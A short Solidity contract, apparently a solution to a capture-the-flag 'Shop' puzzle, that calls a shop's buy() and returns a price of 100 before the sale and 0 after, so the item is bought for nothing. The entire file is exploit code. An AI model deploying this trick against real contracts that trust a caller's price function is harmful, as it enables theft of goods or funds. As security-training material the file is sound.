// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IShop {
    function buy() external;

    function isSold() external view returns (bool);
}

contract AttackShop {
    IShop private shop;

    constructor(address _shop) {
        shop = IShop(_shop);
    }

    function attack() external {
        shop.buy();
    }

    function price() external view returns (uint) {
        return shop.isSold() ? 0 : 100;
    }
}
